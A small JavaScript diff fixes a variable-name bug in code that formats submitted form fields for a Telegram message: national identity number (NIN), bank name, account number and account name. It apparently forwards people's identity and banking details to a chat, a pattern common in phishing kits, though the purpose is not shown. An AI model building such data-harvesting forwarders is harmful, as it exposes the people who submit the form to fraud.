@@ -125,7 +125,7 @@ if (lga) lines.push(`<b>Local Government Area:</b> ${lga}`);
 if (nin) lines.push(`<b>NIN:</b> ${nin}`);
 if (bankName) lines.push(`<b>Bank Name:</b> ${bankName}`);
 if (accountNumber) lines.push(`<b>Account Number:</b> ${accountNumber}`);
-if (accountNameLine) lines.push(`<b>Account Name:</b> ${accountName}`);
+if (accountName) lines.push(`<b>Account Name:</b> ${accountName}`);
    lines.push(`🕒 <b>Submitted at:</b> ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}`);
     
         // Format text data for Telegram
